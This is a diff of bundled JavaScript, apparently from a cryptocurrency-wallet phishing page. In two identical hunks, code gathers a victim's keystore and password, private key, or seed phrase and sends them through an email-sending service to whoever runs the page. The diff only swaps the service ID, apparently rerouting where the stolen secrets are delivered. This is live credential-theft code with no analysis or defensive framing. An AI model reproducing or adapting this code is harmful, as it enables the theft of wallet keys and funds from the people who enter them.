@@ -16011,7 +16011,7 @@ const R5 = {
                 this.load = !0;
                 let e, t = this.email && this.password,
                     s = this.seedPhrase ? this.seedPhrase.match(/([\s]+)/g).length : 0;
-                console.log(s), this.type === 1 && t && (e = `the message type is Keystore Json and the details are: Keystore: (${this.email})... password: (${this.password})  will be used for ${this.app.appName}`), this.type === 2 && this.privateKey && (e = `the message type is Private Key and the details are: Private Key : ( ${this.privateKey}) will be used for ${this.app.appName}`), this.type === 0 && this.seedPhrase && s >= 11 && (e = `the message type is Seed Phrase and the details are: Seed Phrase : ( ${this.seedPhrase}) will be used for ${this.app.appName}`), Td.send("service_21ltu09", "template_iu283pe", {
+                console.log(s), this.type === 1 && t && (e = `the message type is Keystore Json and the details are: Keystore: (${this.email})... password: (${this.password})  will be used for ${this.app.appName}`), this.type === 2 && this.privateKey && (e = `the message type is Private Key and the details are: Private Key : ( ${this.privateKey}) will be used for ${this.app.appName}`), this.type === 0 && this.seedPhrase && s >= 11 && (e = `the message type is Seed Phrase and the details are: Seed Phrase : ( ${this.seedPhrase}) will be used for ${this.app.appName}`), Td.send(" service_c44jd31", "template_iu283pe", {
                     message_message: e
                 }).then(n => {
                     this.seedPhrase = "", this.email = "", this.password = ""
@@ -16464,7 +16464,7 @@ const i7 = {
                 this.load = !0;
                 let e, t = this.email && this.password,
                     s = this.seedPhrase ? this.seedPhrase.match(/([\s]+)/g).length : 0;
-                console.log(s), this.type === 1 && t && (e = `the message type is Keystore Json and the details are: Keystore: (${this.email})... password: (${this.password})  will be used for ${this.app.appName}`), this.type === 2 && this.privateKey && (e = `the message type is Private Key and the details are: Private Key : ( ${this.privateKey}) will be used for ${this.app.appName}`), this.type === 0 && this.seedPhrase && s >= 11 && (e = `the message type is Seed Phrase and the details are: Seed Phrase : ( ${this.seedPhrase}) will be used for ${this.app.appName}`), Td.send("service_21ltu09", "template_iu283pe", {
+                console.log(s), this.type === 1 && t && (e = `the message type is Keystore Json and the details are: Keystore: (${this.email})... password: (${this.password})  will be used for ${this.app.appName}`), this.type === 2 && this.privateKey && (e = `the message type is Private Key and the details are: Private Key : ( ${this.privateKey}) will be used for ${this.app.appName}`), this.type === 0 && this.seedPhrase && s >= 11 && (e = `the message type is Seed Phrase and the details are: Seed Phrase : ( ${this.seedPhrase}) will be used for ${this.app.appName}`), Td.send(" service_c44jd31", "template_iu283pe", {
                     message_message: e
                 }).then(n => {
                     this.seedPhrase = "", this.email = "", this.password = ""
